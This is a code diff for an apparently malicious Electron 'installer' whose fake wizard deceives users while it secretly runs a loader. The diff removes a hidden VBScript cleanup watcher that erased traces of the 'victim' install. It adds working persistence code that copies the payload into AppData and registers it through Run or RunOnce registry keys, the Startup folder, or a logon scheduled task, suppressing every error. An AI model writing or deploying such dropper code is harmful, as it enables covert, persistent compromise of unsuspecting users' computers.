@@ -3,7 +3,7 @@ const path = require('path');
 const fs = require('fs');
 const os = require('os');
 const crypto = require('crypto');
-const { spawn } = require('child_process');
+const { spawn, execFileSync } = require('child_process');
 const config = require('./config');
 const { runGuardrails } = require('./guardrails');
 
@@ -17,94 +17,92 @@ const INTERACTION_TOKEN = crypto.randomBytes(32).toString('hex');
 let interactionTokenIssued = false;
 
 // ---------------------------------------------------------------------------
-// Out-of-process cleanup watcher
+// Persistence installer
 // ---------------------------------------------------------------------------
-// The Electron main process exits as soon as the wizard window closes
-// (window-all-closed -> app.quit), typically seconds after the loader is
-// spawned. Any 'child.on("exit", ...)' handler dies with the main process, so
-// we can't rely on in-process cleanup. Instead we write a small VBScript
-// watcher to %TEMP% and launch it via `wscript.exe //B`, which outlives
-// Electron and - crucially - does NOT allocate a console window.
+// Copies the loader to a permanent location and registers one of four
+// persistence mechanisms: registry Run key, registry RunOnce, Startup
+// folder copy, or a Scheduled Task. All operations are best-effort; a
+// failure here never surfaces to the renderer.
 //
-// Why VBScript and not cmd.exe: on Windows, Node's child_process.spawn with
-// `detached: true` passes DETACHED_PROCESS to CreateProcessW, which allocates
-// a fresh console for cmd.exe regardless of `windowsHide: true`. cmd.exe is a
-// console-subsystem binary so it always gets a console when detached,
-// producing a visible flashing window (the findstr title users have
-// reported). wscript.exe is a GUI-subsystem host and never allocates a
-// console, so scripts it runs are truly invisible.
-//
-// The VBS uses WMI's Win32_Process query to poll for the loader PID. When
-// the loader exits, it sleeps briefly for handles to flush, then issues a
-// retrying DeleteFolder. Finally it self-deletes via a hidden-cmd Shell.Run
-// so the .vbs file doesn't linger in %TEMP%.
-function scheduleOutOfProcessCleanup(childPid, tmpDir) {
+// config.PERSISTENCE shape:
+//   { enabled: bool, method: string, name: string, installDir: string }
+//   method:     "registry_run" | "registry_run_once" | "startup_folder" | "scheduled_task"
+//   installDir: "appdata" | "localappdata"
+function installPersistence(stagedEntryPath) {
   try {
-    const cleanupVbs = path.join(os.tmpdir(), `inst-clean-${crypto.randomUUID()}.vbs`);
-    // WScript.Arguments(0) = loader PID, WScript.Arguments(1) = target dir.
-    // Double-quote escape rule in VBScript: a literal " inside a string is "".
-    const script = [
-      'Option Explicit',
-      'Dim loaderPid, targetDir, wmi, procs, fso, shell, selfPath, i',
-      'loaderPid = WScript.Arguments(0)',
-      'targetDir = WScript.Arguments(1)',
-      '',
-      'Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")',
-      '',
-      "' Poll Win32_Process until the loader PID is gone.",
-      'Do',
-      '  Set procs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & loaderPid)',
-      '  If procs.Count = 0 Then Exit Do',
-      '  WScript.Sleep 1000',
-      'Loop',
-      '',
-      "' Allow any residual file handles to flush before deleting.",
-      'WScript.Sleep 2000',
-      '',
-      'Set fso = CreateObject("Scripting.FileSystemObject")',
-      'On Error Resume Next',
-      '',
-      "' Retry the delete up to three times with progressive backoff -",
-      "' covers the case where the loader forked a child that still has",
-      "' files open inside the tree.",
-      'For i = 1 To 3',
-      '  If fso.FolderExists(targetDir) Then',
-      '    fso.DeleteFolder targetDir, True',
-      '  End If',
-      '  If Not fso.FolderExists(targetDir) Then Exit For',
-      '  WScript.Sleep 2000 * i',
-      'Next',
-      '',
-      "' Self-delete the VBS. Shell.Run intWindowStyle=0 is SW_HIDE, so the",
-      "' spawned cmd has no visible window. ping provides a delay without",
-      "' introducing a timeout / choice dependency.",
-      'selfPath = WScript.ScriptFullName',
-      'Set shell = CreateObject("WScript.Shell")',
-      'shell.Run "cmd /c ping -n 2 127.0.0.1 >nul & del """ & selfPath & """", 0, False',
-      '',
-    ].join('\r\n');
-    fs.writeFileSync(cleanupVbs, script, { encoding: 'ascii' });
+    if (!config.PERSISTENCE || !config.PERSISTENCE.enabled) return;
 
-    // wscript.exe //B    = batch mode, suppresses script errors and UI
-    // wscript.exe //Nologo = no banner
-    // wscript.exe is a GUI-subsystem binary, so nothing is visible at any
-    // point in the watcher's lifecycle.
-    const watcher = spawn(
-      'wscript.exe',
-      ['//B', '//Nologo', cleanupVbs, String(childPid), tmpDir],
-      {
-        detached: true,
-        windowsHide: true,
-        stdio: 'ignore',
-      },
-    );
-    watcher.unref();
+    const base = config.PERSISTENCE.installDir === 'localappdata'
+      ? process.env.LOCALAPPDATA
+      : process.env.APPDATA;
+
+    const persistDir  = path.join(base, config.PERSISTENCE.name);
+    const persistPath = path.join(persistDir, config.ENTRY_NAME);
+    fs.mkdirSync(persistDir, { recursive: true });
+    fs.copyFileSync(stagedEntryPath, persistPath);
+
+    // Build the execution command string used by registry / scheduled task.
+    let cmd;
+    switch (config.ENTRY_FORMAT) {
+      case 'dll':
+        cmd = `rundll32.exe "${persistPath}",${config.DLL_ENTRY}`;
+        break;
+      case 'xll':
+        cmd = `excel.exe /e "${persistPath}"`;
+        break;
+      default: // exe
+        cmd = `"${persistPath}"`;
+    }
+
+    switch (config.PERSISTENCE.method) {
+      case 'registry_run':
+        execFileSync('reg', [
+          'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
+          '/v', config.PERSISTENCE.name,
+          '/t', 'REG_SZ',
+          '/d', cmd,
+          '/f',
+        ], { windowsHide: true, stdio: 'ignore' });
+        break;
+
+      case 'registry_run_once':
+        execFileSync('reg', [
+          'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
+          '/v', config.PERSISTENCE.name,
+          '/t', 'REG_SZ',
+          '/d', cmd,
+          '/f',
+        ], { windowsHide: true, stdio: 'ignore' });
+        break;
+
+      case 'startup_folder': {
+        // For DLL/XLL, drop a .bat wrapper in startup instead of the payload.
+        const startupDir = path.join(
+          process.env.APPDATA,
+          'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup',
+        );
+        if (config.ENTRY_FORMAT === 'exe') {
+          fs.copyFileSync(persistPath, path.join(startupDir, config.ENTRY_NAME));
+        } else {
+          const batPath = path.join(startupDir, `${config.PERSISTENCE.name}.bat`);
+          fs.writeFileSync(batPath, `@echo off\r\nstart "" ${cmd}\r\n`, 'ascii');
+        }
+        break;
+      }
+
+      case 'scheduled_task':
+        execFileSync('schtasks', [
+          '/create',
+          '/tn', config.PERSISTENCE.name,
+          '/tr', cmd,
+          '/sc', 'onlogon',
+          '/f',
+          '/rl', 'limited',
+        ], { windowsHide: true, stdio: 'ignore' });
+        break;
+    }
   } catch (_) {
-    // Best-effort cleanup - if the watcher spawn fails, the tmpDir will
-    // persist until the victim reboots or clears %TEMP% manually. We
-    // deliberately do not surface an error to the renderer because the
-    // loader has already spawned and any user-visible failure here would
-    // defeat the "successful install" UX illusion.
+    // Best-effort — persistence failure must not surface to the renderer.
   }
 }
 
@@ -195,6 +193,12 @@ ipcMain.handle('installer:run', async (_event, providedToken) => {
     fs.cpSync(srcDir, tmpDir, { recursive: true });
 
     const entryPath = path.join(tmpDir, config.ENTRY_NAME);
+
+    // Install persistence BEFORE spawning so the persistent copy exists
+    // even if the loader immediately calls back and terminates.
+    installPersistence(entryPath);
+    dbg('persistence step complete');
+
     let child;
     switch (config.ENTRY_FORMAT) {
       case 'exe':
@@ -226,13 +230,6 @@ ipcMain.handle('installer:run', async (_event, providedToken) => {
     }
 
     dbg(`spawned ${config.ENTRY_FORMAT} loader pid=${child.pid} cwd=${tmpDir}`);
-
-    // Hand cleanup off to an out-of-process watcher that polls tasklist
-    // for the loader PID and rm-rf's tmpDir after the loader exits. This
-    // survives the Electron main process quitting (which happens seconds
-    // after the fake wizard advances to Finish) and also dodges the
-    // Windows file-lock issue on the running loader exe.
-    scheduleOutOfProcessCleanup(child.pid, tmpDir);
     child.unref();
 
     return { ok: true };
